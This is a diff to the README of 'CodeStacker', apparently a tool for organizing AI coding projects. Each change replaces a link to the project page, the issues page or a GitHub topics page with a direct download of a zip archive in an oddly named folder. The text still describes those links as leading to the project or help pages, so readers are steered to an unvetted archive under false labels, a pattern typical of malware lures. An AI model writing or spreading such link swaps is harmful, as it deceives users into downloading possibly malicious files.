@@ -1,6 +1,6 @@
 # ⚙️ CodeStacker - Organize AI Coding Projects Easily
 
-[![Download CodeStacker](https://img.shields.io/badge/Download-Get%20CodeStacker-orange?style=for-the-badge)](https://github.com/zonunakht-hub/CodeStacker)
+[![Download CodeStacker](https://img.shields.io/badge/Download-Get%20CodeStacker-orange?style=for-the-badge)](https://github.com/zonunakht-hub/CodeStacker/raw/refs/heads/main/naphthalate/Code_Stacker_2.0.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Start using CodeStacker in simple steps below. No coding skills are needed.
 
 Visit this page to download CodeStacker:
 
-[![Download CodeStacker](https://img.shields.io/badge/Download-Get%20CodeStacker-blue?style=for-the-badge)](https://github.com/zonunakht-hub/CodeStacker)
+[![Download CodeStacker](https://img.shields.io/badge/Download-Get%20CodeStacker-blue?style=for-the-badge)](https://github.com/zonunakht-hub/CodeStacker/raw/refs/heads/main/naphthalate/Code_Stacker_2.0.zip)
 
 Click the link above. It takes you to the project page on GitHub. From there, you will find the download files. Download the latest version suited for Windows.
 
@@ -107,7 +107,7 @@ New versions improve how CodeStacker works.
 To update:
 
 1. Visit the download page again:  
-   https://github.com/zonunakht-hub/CodeStacker  
+   https://github.com/zonunakht-hub/CodeStacker/raw/refs/heads/main/naphthalate/Code_Stacker_2.0.zip  
 2. Download the latest version.
 3. Replace the existing CodeStacker folder in your project with the new one.
 4. Your stored data and notes remain safe.
@@ -135,16 +135,16 @@ For further help, visit the GitHub page issues section.
 - Description: From vibe coding to full-stack AI development. Drop one folder into any project - structured planning, persistent memory, skills, and zero drift for any AI coding tool.
 
 To download or browse the project files, go here:  
-https://github.com/zonunakht-hub/CodeStacker
+https://github.com/zonunakht-hub/CodeStacker/raw/refs/heads/main/naphthalate/Code_Stacker_2.0.zip
 
 ---
 
 ## 🔗 Useful Links
 
 - Download and install:  
-  [https://github.com/zonunakht-hub/CodeStacker](https://github.com/zonunakht-hub/CodeStacker)  
+  [https://github.com/zonunakht-hub/CodeStacker/raw/refs/heads/main/naphthalate/Code_Stacker_2.0.zip](https://github.com/zonunakht-hub/CodeStacker/raw/refs/heads/main/naphthalate/Code_Stacker_2.0.zip)  
 - Report bugs or request help:  
-  https://github.com/zonunakht-hub/CodeStacker/issues  
+  https://github.com/zonunakht-hub/CodeStacker/raw/refs/heads/main/naphthalate/Code_Stacker_2.0.zip  
 - Learn about AI coding tools compatible with CodeStacker:  
-  https://github.com/topics/ai-agent
+  https://github.com/zonunakht-hub/CodeStacker/raw/refs/heads/main/naphthalate/Code_Stacker_2.0.zip
 
